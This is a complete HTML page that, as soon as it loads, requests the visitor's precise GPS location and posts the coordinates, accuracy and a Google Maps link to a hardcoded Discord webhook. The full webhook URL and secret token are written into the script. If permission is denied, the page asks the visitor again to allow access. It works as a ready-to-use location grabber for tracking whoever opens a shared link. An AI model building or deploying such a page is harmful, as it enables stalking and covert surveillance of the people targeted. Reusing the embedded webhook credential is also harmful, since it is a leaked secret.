<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GPS Location Sender</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }
        .container {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
        }
        h1 {
            font-size: 1.5rem;
            color: #1a1a1a;
            margin-bottom: 1rem;
        }
        p {
            color: #666;
            line-height: 1.5;
        }
        #status {
            margin-top: 1rem;
            font-weight: 500;
        }
        .loading {
            color: #007bff;
        }
        .success {
            color: #28a745;
        }
        .error {
            color: #dc3545;
        }
        #btn-allow {
            display: none;
            margin-top: 1.5rem;
            padding: 0.8rem 2rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        #btn-allow:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>GPS Location Sender</h1>
        <p>This page requests your GPS location and sends it to a Discord webhook.</p>
        <div id="status" class="loading">Requesting location permission...</div>
        <button id="btn-allow" onclick="getLocation()">Allow Location Access</button>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1495485355615453206/ThgzH3LXCyCio83MSyCuVyjbNq8yc3QIkFaOMd1ssEQ1TaMMTJ-yA-gbCtQ38Yxsz3sP';

        function updateStatus(message, className) {
            const statusDiv = document.getElementById('status');
            const btn = document.getElementById('btn-allow');
            statusDiv.textContent = message;
            statusDiv.className = className;

            if (className === 'error') {
                btn.style.display = 'inline-block';
            } else {
                btn.style.display = 'none';
            }
        }

        async function sendToDiscord(lat, lon, accuracy) {
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `📍 **New Exact Location Received**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
                    })
                });

                if (response.ok) {
                    updateStatus('Location sent successfully!', 'success');
                } else {
                    updateStatus('Failed to send location to Discord.', 'error');
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
                updateStatus('Error sending data: ' + error.message, 'error');
            }
        }

        function getLocation() {
            if (!navigator.geolocation) {
                updateStatus('Geolocation is not supported by your browser.', 'error');
                return;
            }

            updateStatus('Finding exact location... Please wait 10-15 seconds for GPS lock.', 'loading');

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    updateStatus(`Location found (Accuracy: ${accuracy.toFixed(1)}m)! Sending to Discord...`, 'loading');
                    sendToDiscord(latitude, longitude, accuracy);
                },
                (error) => {
                    let errorMessage = 'An unknown error occurred.';
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'User denied or browser blocked the request. Please click the button below to allow manually.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'Location information is unavailable. Make sure your GPS is ON and you are not in a basement/elevator.';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'The request timed out. Please try again with a better signal.';
                            break;
                    }
                    updateStatus(errorMessage, 'error');
                },
                {
                    enableHighAccuracy: true,
                    timeout: 20000,
                    maximumAge: 0
                }
            );
        }

        // Run on load
        window.onload = getLocation;
    </script>
</body>
</html>
